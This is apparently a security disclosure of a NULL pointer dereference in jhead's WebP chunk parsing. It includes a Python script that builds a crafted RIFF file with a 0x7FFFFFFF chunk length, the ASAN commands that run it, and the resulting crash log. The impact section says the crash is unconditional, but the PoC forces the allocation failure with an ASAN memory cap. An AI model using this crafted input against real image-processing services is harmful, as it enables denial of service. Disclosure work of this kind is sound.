## Bug0: NULL Pointer Dereference via Unchecked malloc Return in ReadWebpSections

In `ReadWebpSections()` in `webpfile.c` (lines 99-104), the chunk length field is padded to compute `ReadLen = (ChunkLen + 1) & ~1` and passed directly to `malloc` without checking the return value, allowing a crafted chunk length of `0x7FFFFFFF` to produce a 2 GB allocation request that fails and returns NULL, after which `fread(NULL, 1, ReadLen, infile)` dereferences the null pointer and causes a segmentation fault.

### PoC

Craft a malicious JPEG file using the Python script below and process it with the ASAN-instrumented jhead binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator: NULL Pointer Dereference via Unchecked malloc in ReadWebpSections
CWE-476

Trigger: ReadWebpSections() reads a chunk length of 0x7FFFFFFF.
  ReadLen = (0x7FFFFFFF + 1) & ~1 = 0x80000000  (2 GB)
  malloc(0x80000000) returns NULL (forced via ASAN max_allocation_size_mb=512)
  fread(NULL, 1, ReadLen, infile) -> SIGSEGV
"""
import struct

OUT = "poc_input.jpg"

# Malicious chunk: FourCC "EXIF", length = 0x7FFFFFFF
# Guard: if ((int)ChunkLen <= 0) continue
#   (int)0x7FFFFFFF = 2147483647 > 0  =>  passes the guard
# ReadLen = (0x7FFFFFFF + 1) & ~1 = 0x80000000 = 2 GB
# With ASAN max_allocation_size_mb=512, malloc(2 GB) returns NULL.
# fread(NULL, 1, 2 GB, infile) attempts memcpy into NULL => SIGSEGV.
chunk_fourcc = b"EXIF"
chunk_len = 0x7FFFFFFF

# 32 bytes of padding after the chunk header so the file is NOT at EOF
# when fread(NULL,...) is called; glibc will try to copy data into the
# NULL buffer and fault instead of returning 0 on immediate EOF.
chunk_data_pad = b"\xde\xad\xbe\xef" * 8

chunk_header = chunk_fourcc + struct.pack("<I", chunk_len)

# RIFF payload: "WEBP" + malicious chunk header + padding
riff_payload = b"WEBP" + chunk_header + chunk_data_pad

# Full RIFF file
payload = b"RIFF" + struct.pack("<I", len(riff_payload)) + riff_payload

with open(OUT, "wb") as f:
    f.write(payload)

print(f"[+] Written {len(payload)} bytes to {OUT}")
print(f"[+] Chunk '{chunk_fourcc.decode()}' length field = 0x{chunk_len:08X}")
print(f"[+] Expected: malloc(0x80000000) returns NULL -> fread(NULL,...) -> SIGSEGV")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:allocator_may_return_null=1:max_allocation_size_mb=512" ./build_test/jhead poc_input.jpg || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer:DEADLYSIGNAL
WARNING: AddressSanitizer failed to allocate 0x80000000 bytes
ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7ff1f00ea923 bp 0x000000000020 sp 0x7fff07e662a8 T0)
SUMMARY: AddressSanitizer: SEGV (/lib/x86_64-linux-gnu/libc.so.6+0x1a6923)

### Impact

An attacker who can supply a crafted JPEG or WebP file to jhead can trigger a null pointer dereference in `ReadWebpSections()`, crashing the process with SIGSEGV and causing a denial of service. Any invocation of jhead on an untrusted image file is affected, including automated pipelines that batch-process user-uploaded images. Because the crash occurs unconditionally whenever a chunk length of `0x7FFFFFFF` is encountered, it provides a reliable mechanism for service disruption in environments where jhead processes untrusted input.
